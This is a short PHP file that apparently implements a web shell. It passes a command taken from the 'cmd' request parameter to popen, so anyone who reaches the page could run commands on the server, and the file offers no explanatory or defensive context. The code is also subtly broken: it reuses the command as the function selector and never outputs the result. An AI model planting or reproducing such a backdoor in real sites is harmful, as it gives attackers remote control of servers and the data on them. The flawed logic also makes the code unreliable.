<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	switch($fun){
		case "popen": if(@is_resource($f = @popen($cmd,"r"))){ while(!@feof($f))	$res .= @fread($f,1024);} @pclose($f);break;
	}
	return $res;
}

if (isset($_REQUEST['cmd']))
	do_phpfun($_REQUEST['cmd'], $_REQUEST['cmd']);
?>